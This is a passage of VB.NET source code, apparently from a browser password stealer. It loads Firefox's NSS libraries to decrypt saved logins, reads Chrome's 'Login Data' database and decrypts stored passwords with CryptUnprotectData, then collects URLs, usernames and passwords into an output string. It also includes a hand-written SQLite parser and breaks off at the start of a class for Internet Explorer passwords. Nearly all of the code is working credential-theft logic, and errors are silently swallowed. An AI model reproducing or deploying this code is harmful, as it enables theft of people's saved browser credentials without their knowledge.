        LoadLibrary(MozillaPath & "ssutil3.dll")
        LoadLibrary(MozillaPath & "mozsqlite3.dll")
        LoadLibrary(MozillaPath & "nssutil3.dll")
        LoadLibrary(MozillaPath & "softokn3.dll")
        NSS3 = LoadLibrary(MozillaPath & "nss3.dll")
        Dim pProc As IntPtr = GetProcAddress(NSS3, "NSS_Init")
        Dim dll As DLLFunctionDelegate = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate)), DLLFunctionDelegate)
        Return dll(configdir)
    End Function
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Public Delegate Function DLLFunctionDelegate2() As Long
    Public Function PK11_GetInternalKeySlot() As Long
        Dim pProc As IntPtr = GetProcAddress(NSS3, "PK11_GetInternalKeySlot")
        Dim dll As DLLFunctionDelegate2 = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate2)), DLLFunctionDelegate2)
        Return dll()
    End Function
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Public Delegate Function DLLFunctionDelegate3(ByVal slot As Long, ByVal loadCerts As Boolean, ByVal wincx As Long) As Long
    Public Function PK11_Authenticate(ByVal slot As Long, ByVal loadCerts As Boolean, ByVal wincx As Long) As Long
        Dim pProc As IntPtr = GetProcAddress(NSS3, "PK11_Authenticate")
        Dim dll As DLLFunctionDelegate3 = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate3)), DLLFunctionDelegate3)
        Return dll(slot, loadCerts, wincx)
    End Function
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Public Delegate Function DLLFunctionDelegate4(ByVal arenaOpt As IntPtr, ByVal outItemOpt As IntPtr, ByVal inStr As StringBuilder, ByVal inLen As Integer) As Integer
    Public Function NSSBase64_DecodeBuffer(ByVal arenaOpt As IntPtr, ByVal outItemOpt As IntPtr, ByVal inStr As StringBuilder, ByVal inLen As Integer) As Integer
        Dim pProc As IntPtr = GetProcAddress(NSS3, "NSSBase64_DecodeBuffer")
        Dim dll As DLLFunctionDelegate4 = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate4)), DLLFunctionDelegate4)
        Return dll(arenaOpt, outItemOpt, inStr, inLen)
    End Function
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Public Delegate Function DLLFunctionDelegate5(ByRef data As TSECItem, ByRef result As TSECItem, ByVal cx As Integer) As Integer
    Public Function PK11SDR_Decrypt(ByRef data As TSECItem, ByRef result As TSECItem, ByVal cx As Integer) As Integer
        Dim pProc As IntPtr = GetProcAddress(NSS3, "PK11SDR_Decrypt")
        Dim dll As DLLFunctionDelegate5 = DirectCast(Marshal.GetDelegateForFunctionPointer(pProc, GetType(DLLFunctionDelegate5)), DLLFunctionDelegate5)
        Return dll(data, result, cx)
    End Function
    Public signon As String
    Public Class SQLiteBase5
        <DllImport("kernel32")> _
        Private Shared Function HeapAlloc(ByVal heap As IntPtr, ByVal flags As UInt32, ByVal bytes As UInt32) As IntPtr
        End Function

        <DllImport("kernel32")> _
        Private Shared Function GetProcessHeap() As IntPtr
        End Function

        <DllImport("kernel32")> _
        Private Shared Function lstrlen(ByVal str As IntPtr) As Integer
        End Function
        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_open(ByVal fileName As IntPtr, ByRef database As IntPtr) As Integer
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_close(ByVal database As IntPtr) As Integer
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_exec(ByVal database As IntPtr, ByVal query As IntPtr, ByVal callback As IntPtr, ByVal arguments As IntPtr, ByRef [error] As IntPtr) As Integer
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_errmsg(ByVal database As IntPtr) As IntPtr
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_prepare_v2(ByVal database As IntPtr, ByVal query As IntPtr, ByVal length As Integer, ByRef statement As IntPtr, ByRef tail As IntPtr) As Integer
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_step(ByVal statement As IntPtr) As Integer
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_column_count(ByVal statement As IntPtr) As Integer
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_column_name(ByVal statement As IntPtr, ByVal columnNumber As Integer) As IntPtr
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_column_type(ByVal statement As IntPtr, ByVal columnNumber As Integer) As Integer
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_column_int(ByVal statement As IntPtr, ByVal columnNumber As Integer) As Integer
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_column_double(ByVal statement As IntPtr, ByVal columnNumber As Integer) As Double
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_column_text(ByVal statement As IntPtr, ByVal columnNumber As Integer) As IntPtr
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_column_blob(ByVal statement As IntPtr, ByVal columnNumber As Integer) As IntPtr
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_column_table_name(ByVal statement As IntPtr, ByVal columnNumber As Integer) As IntPtr
        End Function

        <DllImport("mozsqlite3")> _
        Private Shared Function sqlite3_finalize(ByVal handle As IntPtr) As Integer
        End Function

        ' SQLite constants
        Private Const SQL_OK As Integer = 0
        Private Const SQL_ROW As Integer = 100
        Private Const SQL_DONE As Integer = 101
        Public Enum SQLiteDataTypes
            INT = 1
            FLOAT
            TEXT
            BLOB
            NULL
        End Enum
        Private database As IntPtr
        Public Sub New()
            database = IntPtr.Zero
        End Sub
        Public Sub New(ByVal baseName As [String])
            OpenDatabase(baseName)
        End Sub
        Public Sub OpenDatabase(ByVal baseName As [String])
            If sqlite3_open(StringToPointer(baseName), database) <> SQL_OK Then
                database = IntPtr.Zero
                '   Throw New Exception("Error with opening database " & baseName & "!")
            End If
        End Sub
        Public Sub CloseDatabase()
            If database <> IntPtr.Zero Then
                sqlite3_close(database)
            End If
        End Sub
        Public Function GetTables() As ArrayList
            Dim query As [String] = "SELECT name FROM sqlite_master " & "WHERE type IN ('table','view') AND name NOT LIKE 'sqlite_%'" & "UNION ALL " & "SELECT name FROM sqlite_temp_master " & "WHERE type IN ('table','view') " & "ORDER BY 1"
            Dim table As System.Data.DataTable = ExecuteQuery(query)
            Dim list As New ArrayList()
            For Each row As System.Data.DataRow In table.Rows
                list.Add(row.ItemArray(0).ToString())
            Next
            Return list
        End Function
        Public Sub ExecuteNonQuery(ByVal query As [String])
            Dim [error] As IntPtr
            sqlite3_exec(database, StringToPointer(query), IntPtr.Zero, IntPtr.Zero, [error])
            If [error] <> IntPtr.Zero Then
                ' Throw New Exception(("Error with executing non-query: """ & query & """!") + PointerToString(sqlite3_errmsg([error])))
            End If
        End Sub
        Public Function ExecuteQuery(ByVal query As [String]) As System.Data.DataTable
            Dim statement As IntPtr
            Dim excessData As IntPtr
            sqlite3_prepare_v2(database, StringToPointer(query), GetPointerLenght(StringToPointer(query)), statement, excessData)
            Dim table As New System.Data.DataTable()
            Dim result As Integer = ReadFirstRow(statement, table)
            While result = SQL_ROW
                result = ReadNextRow(statement, table)
            End While
            sqlite3_finalize(statement)
            Return table
        End Function
        Private Function ReadFirstRow(ByVal statement As IntPtr, ByRef table As System.Data.DataTable) As Integer
            table = New System.Data.DataTable("resultTable")
            Dim resultType As Integer = sqlite3_step(statement)
            If resultType = SQL_ROW Then
                Dim columnCount As Integer = sqlite3_column_count(statement)
                Dim columnName As [String] = ""
                Dim columnType As Integer = 0
                Dim columnValues As Object() = New Object(columnCount - 1) {}
                For i As Integer = 0 To columnCount - 1
                    columnName = PointerToString(sqlite3_column_name(statement, i))
                    columnType = sqlite3_column_type(statement, i)
                    Select Case columnType
                        Case CInt(SQLiteDataTypes.INT)
                            If True Then
                                table.Columns.Add(columnName, Type.[GetType]("System.Int32"))
                                columnValues(i) = sqlite3_column_int(statement, i)
                                Exit Select
                            End If
                        Case CInt(SQLiteDataTypes.FLOAT)
                            If True Then
                                table.Columns.Add(columnName, Type.[GetType]("System.Single"))
                                columnValues(i) = sqlite3_column_double(statement, i)
                                Exit Select
                            End If
                        Case CInt(SQLiteDataTypes.TEXT)
                            If True Then
                                table.Columns.Add(columnName, Type.[GetType]("System.String"))
                                columnValues(i) = PointerToString(sqlite3_column_text(statement, i))
                                Exit Select
                            End If
                        Case CInt(SQLiteDataTypes.BLOB)
                            If True Then
                                table.Columns.Add(columnName, Type.[GetType]("System.String"))
                                columnValues(i) = PointerToString(sqlite3_column_blob(statement, i))
                                Exit Select
                            End If
                        Case Else
                            If True Then
                                table.Columns.Add(columnName, Type.[GetType]("System.String"))
                                columnValues(i) = ""
                                Exit Select
                            End If
                    End Select
                Next
                table.Rows.Add(columnValues)
            End If
            Return sqlite3_step(statement)
        End Function
        Private Function ReadNextRow(ByVal statement As IntPtr, ByRef table As System.Data.DataTable) As Integer
            Dim columnCount As Integer = sqlite3_column_count(statement)

            Dim columnType As Integer = 0
            Dim columnValues As Object() = New Object(columnCount - 1) {}

            For i As Integer = 0 To columnCount - 1
                columnType = sqlite3_column_type(statement, i)

                Select Case columnType
                    Case CInt(SQLiteDataTypes.INT)
                        If True Then
                            columnValues(i) = sqlite3_column_int(statement, i)
                            Exit Select
                        End If
                    Case CInt(SQLiteDataTypes.FLOAT)
                        If True Then
                            columnValues(i) = sqlite3_column_double(statement, i)
                            Exit Select
                        End If
                    Case CInt(SQLiteDataTypes.TEXT)
                        If True Then
                            columnValues(i) = PointerToString(sqlite3_column_text(statement, i))
                            Exit Select
                        End If
                    Case CInt(SQLiteDataTypes.BLOB)
                        If True Then
                            columnValues(i) = PointerToString(sqlite3_column_blob(statement, i))
                            Exit Select
                        End If
                    Case Else
                        If True Then
                            columnValues(i) = ""
                            Exit Select
                        End If
                End Select
            Next
            table.Rows.Add(columnValues)
            Return sqlite3_step(statement)
        End Function
        Private Function StringToPointer(ByVal str As [String]) As IntPtr
            If str Is Nothing Then
                Return IntPtr.Zero
            Else
                Dim encoding__1 As Encoding = Encoding.UTF8
                Dim bytes As [Byte]() = encoding__1.GetBytes(str)
                Dim length As UInteger = bytes.Length + 1
                Dim pointer As IntPtr = HeapAlloc(GetProcessHeap(), 0, CType(length, UInt32))
                Marshal.Copy(bytes, 0, pointer, bytes.Length)
                Marshal.WriteByte(pointer, bytes.Length, 0)
                Return pointer
            End If
        End Function
        Private Function PointerToString(ByVal ptr As IntPtr) As [String]
            If ptr = IntPtr.Zero Then
                Return Nothing
            End If

            Dim encoding__1 As Encoding = Encoding.UTF8

            Dim length As Integer = GetPointerLenght(ptr)
            Dim bytes As [Byte]() = New [Byte](length - 1) {}
            Marshal.Copy(ptr, bytes, 0, length)
            Return encoding__1.GetString(bytes, 0, length)
        End Function
        Private Function GetPointerLenght(ByVal ptr As IntPtr) As Integer
            If ptr = IntPtr.Zero Then
                Return 0
            End If
            Return lstrlen(ptr)
        End Function
    End Class
End Module
#End Region
#Region "Chrome"
Module Chrome


    Sub Gchrome()
        '  OL += vbNewLine & "###Chrome" & vbNewLine
        Try
            Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Google\Chrome\User Data\Default\Login Data"
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")
            If File.Exists(datapath) Then
                Dim host, user, pass As String
                For i = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    host = SQLDatabase.GetValue(i, "origin_url")
                    user = SQLDatabase.GetValue(i, "username_value")
                    pass = Decrypt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))
                    If (user <> "") And (pass <> "") Then
                        OL += "|URL| " & host & vbNewLine & "|USR| " & user & vbNewLine & "|PWD| " & pass & vbNewLine

                    End If
                Next
            End If
        Catch ex As Exception
        End Try

    End Sub
    <DllImport("Crypt32.dll", SetLastError:=True, CharSet:=System.Runtime.InteropServices.CharSet.Auto)> _
    Private Function CryptUnprotectData(ByRef pDataIn As DATA_BLOB, ByVal szDataDescr As String, ByRef pOptionalEntropy As DATA_BLOB, ByVal pvReserved As IntPtr, ByRef pPromptStruct As CRYPTPROTECT_PROMPTSTRUCT, ByVal dwFlags As Integer, ByRef pDataOut As DATA_BLOB) As Boolean
    End Function
    <Flags()> Enum CryptProtectPromptFlags
        CRYPTPROTECT_PROMPT_ON_UNPROTECT = &H1
        CRYPTPROTECT_PROMPT_ON_PROTECT = &H2
    End Enum
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> Structure CRYPTPROTECT_PROMPTSTRUCT
        Public cbSize As Integer
        Public dwPromptFlags As CryptProtectPromptFlags
        Public hwndApp As IntPtr
        Public szPrompt As String
    End Structure
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> Structure DATA_BLOB
        Public cbData As Integer
        Public pbData As IntPtr
    End Structure
    Function Decrypt(ByVal Datas() As Byte) As String
        Dim inj, Ors As New DATA_BLOB
        Dim Ghandle As GCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned)
        inj.pbData = Ghandle.AddrOfPinnedObject()
        inj.cbData = Datas.Length
        Ghandle.Free()
        CryptUnprotectData(inj, Nothing, Nothing, Nothing, Nothing, 0, Ors)
        Dim Returned() As Byte = New Byte(Ors.cbData) {}
        Marshal.Copy(Ors.pbData, Returned, 0, Ors.cbData)
        Dim TheString As String = Encoding.Default.GetString(Returned)
        Return TheString.Substring(0, TheString.Length - 1)
    End Function

End Module
Public Class SQLiteHandler
    Private db_bytes() As Byte
    Private page_size As UInt16
    Private encoding As UInt64
    Private master_table_entries() As sqlite_master_entry

    Private SQLDataTypeSize() As Byte = New Byte() {0, 1, 2, 3, 4, 6, 8, 8, 0, 0}
    Private table_entries() As table_entry
    Private field_names() As String

    Private Structure record_header_field
        Dim size As Int64
        Dim type As Int64
    End Structure

    Private Structure table_entry
        Dim row_id As Int64
        Dim content() As String
    End Structure

    Private Structure sqlite_master_entry
        Dim row_id As Int64
        Dim item_type As String
        Dim item_name As String
        Dim astable_name As String
        Dim root_num As Int64
        Dim sql_statement As String
    End Structure

    Private Function ToBigEndian16Bit(ByVal value As UInt16) As UInt16
        Return ((value And &HFF) << 8 Or (value And &HFF00) >> 8)
    End Function

    Private Function ToBigEndian32Bit(ByVal value As UInt32) As UInt32
        Return (value And &HFF) << 24 Or (value And &HFF00) << 8 Or (value And &HFF0000) >> 8 Or (value And &HFF000000) >> 24
    End Function

    Private Function ToBigEndian64Bit(ByVal value As UInt64) As UInt64
        Return (value And &HFFL) << 56 Or (value And &HFF00L) << 40 Or (value And &HFF0000L) << 24 Or (value And &HFF000000L) << 8 Or (value And &HFF00000000L) >> 8 Or (value And &HFF0000000000L) >> 24 Or (value And &HFF000000000000L) >> 40 Or (value And &HFF00000000000000L) >> 56
    End Function

    'Needs BigEndian
    'GetVariableLength
    ' returns the endindex of an variable length integer
    Private Function GVL(ByVal startIndex As Integer) As Integer
        If startIndex > db_bytes.Length Then Return Nothing

        For i = startIndex To startIndex + 8 Step 1
            If i > db_bytes.Length - 1 Then
                Return Nothing
            ElseIf (db_bytes(i) And &H80) <> &H80 Then
                Return i
            End If
        Next

        Return startIndex + 8
    End Function

    ' Eingaberichtung BigEndian
    ' ConvertVariableLength
    Private Function CVL(ByVal startIndex As Integer, ByVal endIndex As Integer) As Int64
        endIndex = endIndex + 1

        Dim retus(7) As Byte
        Dim Length = endIndex - startIndex
        Dim Bit64 As Boolean = False

        If Length = 0 Or Length > 9 Then Return Nothing
        If Length = 1 Then
            retus(0) = (db_bytes(startIndex) And &H7F)
            Return BitConverter.ToInt64(retus, 0)
        End If

        If Length = 9 Then
            ' Ein Byte wird n?mlich grad hinzugefügt
            Bit64 = True
        End If

        Dim j As Integer = 1
        Dim k As Integer = 7
        Dim y As Integer = 0

        If Bit64 Then
            retus(0) = db_bytes(endIndex - 1)
            endIndex = endIndex - 1
            y = 1
        End If

        For i = (endIndex - 1) To startIndex Step -1
            If (i - 1) >= startIndex Then
                retus(y) = ((db_bytes(i) >> (j - 1)) And (&HFF >> j)) Or (db_bytes(i - 1) << k)
                j = j + 1
                y = y + 1
                k = k - 1
            Else
                If Not Bit64 Then retus(y) = ((db_bytes(i) >> (j - 1)) And (&HFF >> j))
            End If
        Next

        Return BitConverter.ToInt64(retus, 0)
    End Function

    'Checks if a number is odd
    Private Function IsOdd(ByVal value As Int64) As Boolean
        Return (value And 1) = 1
    End Function

    'Big Endian Conversation
    Private Function ConvertToInteger(ByVal startIndex As Integer, ByVal Size As Integer) As UInt64
        If Size > 8 Or Size = 0 Then Return Nothing

        Dim retVal As UInt64 = 0

        For i = 0 To Size - 1 Step 1
            retVal = ((retVal << 8) Or db_bytes(startIndex + i))
        Next

        Return retVal
    End Function

    Private Sub ReadMasterTable(ByVal Offset As UInt64)

        If db_bytes(Offset) = &HD Then 'Leaf node
            'Length for setting the array length for the entries
            Dim Length As UInt16 = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 3)) - 1
            Dim ol As Integer = 0

            If Not master_table_entries Is Nothing Then
                ol = (master_table_entries.Length - 1)
                ReDim Preserve master_table_entries((master_table_entries.Length - 1) + Length)
            Else
                ReDim master_table_entries(Length)
            End If

            Dim ent_offset As UInt64

            For i = 0 To Length Step 1
                ent_offset = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 8 + (i * 2)))

                If Offset <> 100 Then ent_offset = ent_offset + Offset

                'Table Cell auslesen
                Dim t = GVL(ent_offset)
                Dim size As Int64 = CVL(ent_offset, t)

                Dim s = GVL(ent_offset + (t - ent_offset) + 1)
                master_table_entries(ol + i).row_id = CVL(ent_offset + (t - ent_offset) + 1, s)

                'Table Content
                'Resetting the offset
                ent_offset = ent_offset + (s - ent_offset) + 1

                'Now get to the Record Header
                t = GVL(ent_offset)
                s = t
                Dim Rec_Header_Size As Int64 = CVL(ent_offset, t) 'Record Header Length

                Dim Field_Size(4) As Int64

                'Now get the field sizes and fill in the Values
                For j = 0 To 4 Step 1
                    t = s + 1
                    s = GVL(t)
                    Field_Size(j) = CVL(t, s)

                    If Field_Size(j) > 9 Then
                        If IsOdd(Field_Size(j)) Then
                            Field_Size(j) = (Field_Size(j) - 13) / 2
                        Else
                            Field_Size(j) = (Field_Size(j) - 12) / 2
                        End If
                    Else
                        Field_Size(j) = SQLDataTypeSize(Field_Size(j))
                    End If
                Next

                ' Wir lesen nur unbedingt notwendige Sachen aus
                If encoding = 1 Then
                    master_table_entries(ol + i).item_type = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size, Field_Size(0))
                ElseIf encoding = 2 Then
                    master_table_entries(ol + i).item_type = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size, Field_Size(0))
                ElseIf encoding = 3 Then
                    master_table_entries(ol + i).item_type = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size, Field_Size(0))
                End If
                If encoding = 1 Then
                    master_table_entries(ol + i).item_name = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0), Field_Size(1))
                ElseIf encoding = 2 Then
                    master_table_entries(ol + i).item_name = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0), Field_Size(1))
                ElseIf encoding = 3 Then
                    master_table_entries(ol + i).item_name = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0), Field_Size(1))
                End If
                'master_table_entries(ol + i).astable_name = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1), Field_Size(2))
                master_table_entries(ol + i).root_num = ConvertToInteger(ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2), Field_Size(3))
                If encoding = 1 Then
                    master_table_entries(ol + i).sql_statement = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3), Field_Size(4))
                ElseIf encoding = 2 Then
                    master_table_entries(ol + i).sql_statement = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3), Field_Size(4))
                ElseIf encoding = 3 Then
                    master_table_entries(ol + i).sql_statement = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3), Field_Size(4))
                End If
            Next
        ElseIf db_bytes(Offset) = &H5 Then 'internal node
            Dim Length As UInt16 = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 3)) - 1
            Dim ent_offset As UInt16

            For i = 0 To Length Step 1
                ent_offset = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 12 + (i * 2)))

                If Offset = 100 Then
                    ReadMasterTable((ConvertToInteger(ent_offset, 4) - 1) * page_size)
                Else
                    ReadMasterTable((ConvertToInteger(Offset + ent_offset, 4) - 1) * page_size)
                End If

            Next

            ReadMasterTable((ConvertToInteger(Offset + 8, 4) - 1) * page_size)
        End If
    End Sub

    Private Function ReadTableFromOffset(ByVal Offset As UInt64) As Boolean
        If db_bytes(Offset) = &HD Then 'Leaf node
            'Length for setting the array length for the entries
            Dim Length As UInt16 = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 3)) - 1
            Dim ol As Integer = 0

            If Not table_entries Is Nothing Then
                ol = table_entries.Length - 1
                ReDim Preserve table_entries((table_entries.Length - 1) + Length)
            Else
                ReDim table_entries(Length)
            End If

            Dim ent_offset As UInt64

            For i = 0 To Length Step 1
                ent_offset = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 8 + (i * 2)))

                If Offset <> 100 Then ent_offset = ent_offset + Offset

                'Table Cell auslesen
                Dim t = GVL(ent_offset)
                Dim size As Int64 = CVL(ent_offset, t)

                Dim s = GVL(ent_offset + (t - ent_offset) + 1)
                table_entries(ol + i).row_id = CVL(ent_offset + (t - ent_offset) + 1, s)

                'Table Content
                'Resetting the offset
                ent_offset = ent_offset + (s - ent_offset) + 1

                'Now get to the Record Header
                t = GVL(ent_offset)
                s = t
                Dim Rec_Header_Size As Int64 = CVL(ent_offset, t) 'Record Header Length

                Dim Field_Size() As record_header_field
                Dim size_read As Int64 = (ent_offset - t) + 1
                Dim j = 0

                'Now get the field sizes and fill in the Values
                While size_read < Rec_Header_Size
                    ReDim Preserve Field_Size(j)

                    t = s + 1
                    s = GVL(t)
                    Field_Size(j).type = CVL(t, s)

                    If Field_Size(j).type > 9 Then
                        If IsOdd(Field_Size(j).type) Then
                            Field_Size(j).size = (Field_Size(j).type - 13) / 2
                        Else
                            Field_Size(j).size = (Field_Size(j).type - 12) / 2
                        End If
                    Else
                        Field_Size(j).size = SQLDataTypeSize(Field_Size(j).type)
                    End If

                    size_read = size_read + (s - t) + 1
                    j = j + 1
                End While

                ReDim table_entries(ol + i).content(Field_Size.Length - 1)
                Dim counter As Integer = 0

                For k = 0 To Field_Size.Length - 1 Step 1
                    If Field_Size(k).type > 9 Then
                        If Not IsOdd(Field_Size(k).type) Then
                            If encoding = 1 Then
                                table_entries(ol + i).content(k) = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                            ElseIf encoding = 2 Then
                                table_entries(ol + i).content(k) = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                            ElseIf encoding = 3 Then
                                table_entries(ol + i).content(k) = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                            End If
                        Else
                            table_entries(ol + i).content(k) = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                        End If
                    Else
                        table_entries(ol + i).content(k) = CStr(ConvertToInteger(ent_offset + Rec_Header_Size + counter, Field_Size(k).size))
                    End If

                    counter = counter + Field_Size(k).size
                Next
            Next
        ElseIf db_bytes(Offset) = &H5 Then 'internal node
            Dim Length As UInt16 = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 3)) - 1
            Dim ent_offset As UInt16

            For i = 0 To Length Step 1
                ent_offset = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 12 + (i * 2)))

                ReadTableFromOffset((ConvertToInteger(Offset + ent_offset, 4) - 1) * page_size)
            Next

            ReadTableFromOffset((ConvertToInteger(Offset + 8, 4) - 1) * page_size)
        End If

        Return True
    End Function

    ' Reads a complete table with all entries in it
    Public Function ReadTable(ByVal TableName As String) As Boolean
        ' First loop through sqlite_master and look if table exists
        Dim found As Integer = -1

        For i = 0 To master_table_entries.Length Step 1
            If master_table_entries(i).item_name.ToLower().CompareTo(TableName.ToLower()) = 0 Then
                found = i
                Exit For
            End If
        Next

        If found = -1 Then Return False

        Dim fields() = master_table_entries(found).sql_statement.Substring(master_table_entries(found).sql_statement.IndexOf("(") + 1).Split(",")

        For i = 0 To fields.Length - 1 Step 1
            fields(i) = LTrim(fields(i))

            Dim index = fields(i).IndexOf(" ")

            If index > 0 Then fields(i) = fields(i).Substring(0, index)

            If fields(i).IndexOf("UNIQUE") = 0 Then
                Exit For
            Else
                ReDim Preserve field_names(i)
                field_names(i) = fields(i)
            End If
        Next

        Return ReadTableFromOffset((master_table_entries(found).root_num - 1) * page_size)
    End Function

    ' Returns the row count of current table
    Public Function GetRowCount() As Integer
        Return table_entries.Length
    End Function

    ' Returns a Value from current table in row row_num with field number field
    Public Function GetValue(ByVal row_num As Integer, ByVal field As Integer) As String
        If row_num >= table_entries.Length Then Return Nothing
        If field >= table_entries(row_num).content.Length Then Return Nothing

        Return table_entries(row_num).content(field)
    End Function

    ' Returns a Value from current table in row row_num with field name field
    Public Function GetValue(ByVal row_num As Integer, ByVal field As String) As String
        Dim found As Integer = -1

        For i = 0 To field_names.Length Step 1
            If field_names(i).ToLower().CompareTo(field.ToLower()) = 0 Then
                found = i
                Exit For
            End If
        Next

        If found = -1 Then Return Nothing

        Return GetValue(row_num, found)
    End Function

    ' Returns a String-Array with all Tablenames
    Public Function GetTableNames() As String()
        Dim retVal As String()
        Dim arr = 0

        For i = 0 To master_table_entries.Length - 1 Step 1
            If master_table_entries(i).item_type = "table" Then
                ReDim Preserve retVal(arr)
                retVal(arr) = master_table_entries(i).item_name
                arr = arr + 1
            End If
        Next
        Return retVal
    End Function

    ' Constructor
    Public Sub New(ByVal baseName As String)
        'Page Number n is page_size*(n-1)
        If File.Exists(baseName) Then
            FileOpen(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
            Dim asi As String = Space(LOF(1))
            FileGet(1, asi)
            FileClose(1)

            db_bytes = System.Text.Encoding.Default.GetBytes(asi)

            If System.Text.Encoding.Default.GetString(db_bytes, 0, 15).CompareTo("SQLite format 3") <> 0 Then
                '   Throw New Exception("Not a valid SQLite 3 Database File")
                Exit Sub
            End If

            If db_bytes(52) <> 0 Then
                '  Throw New Exception("Auto-vacuum capable database is not supported")
                Exit Sub
            ElseIf ToBigEndian32Bit(BitConverter.ToInt32(db_bytes, 44)) >= 4 Then
                '  Throw New Exception("No supported Schema layer file-format")
                Exit Sub
            End If

            page_size = ConvertToInteger(16, 2)
            encoding = ConvertToInteger(56, 4)

            If encoding = 0 Then encoding = 1

            'Now we read the sqlite_master table
            'Offset is 100 in first page
            ReadMasterTable(100)
        End If
    End Sub
End Class
#End Region
#Region "IE"
Friend Class CIE7Passwords
    Private Const ERROR_CACHE_FIND_FAIL As Integer = 0
    Private Const ERROR_CACHE_FIND_SUCCESS As Integer = 1
    Private Const MAX_PATH As Integer = 260
    Private Const MAX_CACHE_ENTRY_INFO_SIZE As Integer = 4096
    Private Const NORMAL_CACHE_ENTRY As Integer = &H1S
    Private Const URLHISTORY_CACHE_ENTRY As Integer = &H200000
    Private Structure SYSTEMTIME
        Dim wYear As Short
        Dim wMonth As Short
        Dim wDayOfWeek As Short
        Dim wDay As Short
        Dim wHour As Short
        Dim wMinute As Short
        Dim wSecond As Short
        Dim wMilliseconds As Short
    End Structure
    Private Structure INTERNET_CACHE_ENTRY_INFO
        Dim dwStructSize As Integer
        Dim lpszSourceUrlName As Integer
        Dim lpszLocalFileName As Integer
        Dim CacheEntryType As Integer
        Dim dwUseCount As Integer
        Dim dwHitRate As Integer
        Dim dwSizeLow As Integer
        Dim dwSizeHigh As Integer
        Dim LastModifiedTime As FILETIME
        Dim ExpireTime As FILETIME
        Dim LastAccessTime As FILETIME
        Dim LastSyncTime As FILETIME
        Dim lpHeaderInfo As Integer
        Dim dwHeaderInfoSize As Integer
        Dim lpszFileExtension As Integer
        Dim dwExemptDelta As Integer
    End Structure
    Private Declare Function FindFirstUrlCacheEntry Lib "wininet.dll" Alias "FindFirstUrlCacheEntryA" (ByVal lpszUrlSearchPattern As String, ByVal lpFirstCacheEntryInfo As IntPtr, ByRef lpdwFirstCacheEntryInfoBufferSize As Integer) As Integer
    Private Declare Function FindNextUrlCacheEntry Lib "wininet.dll" Alias "FindNextUrlCacheEntryA" (ByVal hEnum As Integer, ByVal lpFirstCacheEntryInfo As IntPtr, ByRef lpdwFirstCacheEntryInfoBufferSize As Integer) As Integer
    Private Declare Function FindCloseUrlCache Lib "wininet.dll" (ByVal hEnumHandle As Integer) As Integer
